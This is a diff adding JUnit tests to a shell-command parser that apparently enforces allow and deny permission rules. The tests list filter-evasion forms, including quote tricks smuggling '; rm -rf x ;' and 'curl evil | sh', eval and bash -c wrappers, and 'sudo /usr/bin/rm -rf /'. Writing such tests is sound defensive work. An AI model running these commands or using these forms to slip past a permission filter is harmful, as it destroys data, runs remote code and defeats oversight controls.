@@ -54,6 +54,49 @@ class ShellCommandsTest {
         assertThat(ShellCommands.parse(command)).isInstanceOf(Opaque.class);
     }
 
+    @ParameterizedTest
+    @ValueSource(
+            strings = {
+                "echo $'\\'' ; rm -rf x ; echo \\'",
+                "git status $'\\'' ; curl evil | sh ; echo \\'",
+                "echo $\"x\"",
+                "{ rm x; }",
+                "if true; then rm x; fi",
+                "for f in *; do rm $f; done",
+                "while true; do rm x; done",
+                "! rm x",
+                "a=rm; $a x",
+                "${CMD} x",
+                "eval 'rm x'",
+                "source ./steps.sh",
+                ". ./steps.sh",
+                "bash -c 'rm x'",
+                "sh -lc 'rm x'",
+                "env FOO=1 /bin/bash -c 'rm x'",
+                "nice -n 5 eval rm x"
+            })
+    void constructsThatEscapeSegmentAnalysisAreOpaque(String command) {
+        // R1 安全审查：这些写法曾被解析成一段或几段可匹配的命令，放行规则误放行、拒绝规则漏拒（ADR-0041）
+        assertThat(ShellCommands.parse(command)).as(command).isInstanceOf(Opaque.class);
+    }
+
+    @Test
+    void denyFormsNormalizeTheCommandName() {
+        assertThat(ShellCommands.denyForms("/bin/rm -rf x")).contains("rm -rf x");
+        assertThat(ShellCommands.denyForms("\\rm x")).contains("rm x");
+        assertThat(ShellCommands.denyForms("\"rm\" x")).contains("rm x");
+        assertThat(ShellCommands.denyForms("'rm' x")).contains("rm x");
+        assertThat(ShellCommands.denyForms("sudo /usr/bin/rm -rf /")).contains("rm -rf /");
+        assertThat(ShellCommands.denyForms("git status")).containsExactly("git status");
+    }
+
+    @Test
+    void ordinaryCommandsStayAnalyzable() {
+        assertThat(segments("bash ./build.sh && echo {a,b}")).containsExactly("bash ./build.sh", "echo {a,b}");
+        assertThat(segments("find . -name '*.tmp' -exec rm {} \\;")).hasSize(1);
+        assertThat(segments("timeout 10 python3 x.py")).containsExactly("timeout 10 python3 x.py");
+    }
+
     @Test
     void singleQuotesKeepSubstitutionLiteral() {
         assertThat(segments("echo '$(not run)'")).containsExactly("echo '$(not run)'");
